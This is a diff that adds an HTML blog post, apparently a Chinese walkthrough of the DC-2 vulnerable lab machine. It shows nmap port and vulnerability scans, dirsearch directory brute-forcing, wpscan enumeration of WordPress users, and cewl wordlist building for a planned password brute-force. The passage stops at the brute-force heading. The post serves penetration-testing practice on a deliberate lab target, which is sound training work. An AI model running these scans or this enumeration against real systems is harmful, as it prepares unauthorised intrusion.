@@ -1,0 +1,784 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DC-靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.124                Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-09 09:54 EDTNmap scan report for 192.168.5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-2 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/4537b1f7b404.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="DC-靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.124                Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-09 09:54 EDTNmap scan report for 192.168.5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/cff9683ff6d6f458e8f8bff60a8cea2a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/198ad5635aa7680e3c55ae4350145cce_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f00205d27ae218d56e31c4841d0dabe0_MD5.png">
+<meta property="article:published_time" content="2023-07-10T03:44:52.000Z">
+<meta property="article:modified_time" content="2023-07-10T12:46:19.746Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/cff9683ff6d6f458e8f8bff60a8cea2a_MD5.png">
+  
+  
+  
+  <title>DC-2 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC-2 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-10 11:44" pubdate>
+          2023年7月10日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          205 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC-2 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DC-靶机"><a href="#DC-靶机" class="headerlink" title="DC-靶机"></a>DC-靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.124                <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 09:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.124<br>Host is up (0.00039s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7744/tcp open  raqmon-pdu<br>MAC Address: 08:00:27:00:39:E2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.50 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开了两个端口 80 和 7744</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,7744 192.168.56.124                             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 09:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.124<br>Host is up (0.00065s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title: Did not follow redirect to http://dc-2/<br>|_http-server-header: Apache/2.4.10 (Debian)<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br>|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br>|   256 <span class="hljs-built_in">df</span>:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br>|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br>MAC Address: 08:00:27:00:39:E2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.19 seconds<br></code></pre></td></tr></table></figure>
+
+<p>80 端口重定向到了 dc-2 的域名下，需要我们将映射写入 hosts 文件。7744 是 ssh 服务，debian 操作系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,7744 192.168.56.124                             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 09:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> dc-2 (192.168.56.124)<br>Host is up (0.00053s latency).<br><br>PORT     STATE SERVICE<br>80/tcp   open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wp-login.php: Possible admin folder</span><br><span class="hljs-string">|   /readme.html: Wordpress version: 2 </span><br><span class="hljs-string">|   /: WordPress version: 4.7.10</span><br><span class="hljs-string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span><br><span class="hljs-string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span><br><span class="hljs-string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span><br><span class="hljs-string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span><br><span class="hljs-string">|   /wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|   /wp-admin/upgrade.php: Wordpress login page.</span><br><span class="hljs-string">|_  /readme.html: Interesting, a readme.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-wordpress-users: </span><br><span class="hljs-string">| Username found: admin</span><br><span class="hljs-string">| Username found: tom</span><br><span class="hljs-string">| Username found: jerry</span><br><span class="hljs-string">|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;</span>http-wordpress-users.limit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">7744/tcp open  raqmon-pdu</span><br><span class="hljs-string">MAC Address: 08:00:27:00:39:E2 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.03 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>漏洞脚本扫描扫出来了 wordpress，顺便目录爆破一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ sudo dirsearch -u http://dc-2/                 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/dc-2/-_23-07-09_10-49-19.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-09_10-49-19.<span class="hljs-built_in">log</span><br><br>Target: http://dc-2/<br><br>[10:49:19] Starting: <br>[10:49:21] 403 -  290B  - /.ht_wsr.txt                                     <br>[10:49:21] 403 -  293B  - /.htaccess.save                                  <br>[10:49:21] 403 -  293B  - /.htaccess.orig<br>[10:49:21] 403 -  295B  - /.htaccess.sample<br>[10:49:21] 403 -  293B  - /.htaccess.bak1<br>[10:49:21] 403 -  284B  - /.html<br>[10:49:21] 403 -  291B  - /.htaccessBAK<br>[10:49:21] 403 -  291B  - /.htaccess_sc                                    <br>[10:49:21] 403 -  283B  - /.htm<br>[10:49:21] 403 -  294B  - /.htaccess_extra<br>[10:49:21] 403 -  291B  - /.htaccessOLD<br>[10:49:21] 403 -  292B  - /.htaccessOLD2<br>[10:49:21] 403 -  293B  - /.htaccess_orig<br>[10:49:21] 403 -  289B  - /.htpasswds<br>[10:49:21] 403 -  290B  - /.httr-oauth                                     <br>[10:49:21] 403 -  293B  - /.htpasswd_test                                  <br>[10:49:21] 403 -  283B  - /.php                                            <br>[10:49:21] 403 -  284B  - /.php3                                           <br>[10:49:41] 301 -    0B  - /index.php  -&gt;  http://dc-2/                      <br>[10:49:43] 200 -   19KB - /license.txt                                      <br>[10:49:50] 200 -    7KB - /readme.html                                      <br>[10:49:51] 403 -  292B  - /server-status                                    <br>[10:49:51] 403 -  293B  - /server-status/<br>[10:49:58] 301 -  299B  - /wp-admin  -&gt;  http://dc-2/wp-admin/              <br>[10:49:58] 200 -    0B  - /wp-content/                                      <br>[10:49:58] 301 -  301B  - /wp-content  -&gt;  http://dc-2/wp-content/          <br>[10:49:58] 200 -   69B  - /wp-content/plugins/akismet/akismet.php           <br>[10:49:58] 500 -    0B  - /wp-content/plugins/hello.php                     <br>[10:49:58] 301 -  302B  - /wp-includes  -&gt;  http://dc-2/wp-includes/        <br>[10:49:58] 500 -    0B  - /wp-includes/rss-functions.php                    <br>[10:49:58] 200 -    0B  - /wp-config.php                                    <br>[10:49:58] 200 -   40KB - /wp-includes/                                     <br>[10:49:59] 302 -    0B  - /wp-admin/  -&gt;  http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;reauth=1<br>[10:49:59] 200 -    1B  - /wp-admin/admin-ajax.php                          <br>[10:49:59] 200 -    2KB - /wp-login.php                                     <br>[10:49:59] 302 -    0B  - /wp-signup.php  -&gt;  http://dc-2/wp-login.php?action=register<br>[10:49:59] 200 -    0B  - /wp-cron.php                                      <br>[10:49:59] 500 -    4KB - /wp-admin/setup-config.php                        <br>[10:49:59] 200 -    1KB - /wp-admin/install.php                             <br>[10:49:59] 405 -   42B  - /xmlrpc.php                                       <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>感觉比较有价值的有: <code>wp-login.php</code>， <code>wp-content/plugins/akismet/akismet.php</code></p>
+<h2 id="wpscan-扫描"><a href="#wpscan-扫描" class="headerlink" title="wpscan 扫描"></a>wpscan 扫描</h2><p>用 wpscan 收集一下用户和插件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ wpscan --url http://dc-2 -e ap,u<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]<br>[+] URL: http://dc-2/ [192.168.56.124]<br>[+] Started: Sun Jul  9 10:11:35 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.2<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jerry<br> | Found By: Wp Json Api (Aggressive Detection)<br> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> | Confirmed By:<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] tom<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sun Jul  9 10:11:40 2023<br>[+] Requests Done: 27<br>[+] Cached Requests: 37<br>[+] Data Sent: 7.013 KB<br>[+] Data Received: 178.184 KB<br>[+] Memory used: 254.168 MB<br>[+] Elapsed time: 00:00:04<br></code></pre></td></tr></table></figure>
+
+<p>得到了用户名 <code>admin</code>, <code>tom</code>, <code>jerry</code>，没有扫到插件，可能是没开启强力模式，先去看看 web 界面吧</p>
+<p><img src="/pic/cff9683ff6d6f458e8f8bff60a8cea2a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag 页面给出了提示，大意是使用 <code>cewl</code> 命令来构建字典，否则一般的字典是爆破不出来的，此外第二个 flag 应该是在两个或者多个用户里中的一个。</p>
+<h2 id="cewl-收集字典"><a href="#cewl-收集字典" class="headerlink" title="cewl 收集字典"></a>cewl 收集字典</h2><p>那思路就很明显了，刚才根据 wpscan 获得了用户名列表，然后根据 cewl 构建字典，最后使用 wpscan 来爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/ &gt; passwdlist     <br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/what-we-do/ &gt;&gt; passwdlist<br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/our-people/ &gt;&gt;passwdlist <br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/our-products/ &gt;&gt; passwdlist <br><br>┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ cewl http://dc-2/index.php/flag/ &gt;&gt; passwdlist <br></code></pre></td></tr></table></figure>
+
+<h2 id="wpscan-爆破"><a href="#wpscan-爆破" class="headerlink" title="wpscan 爆破"></a>wpscan 爆破</h2><p>将可见界面的链接都放进了 passwdlist 中</p>
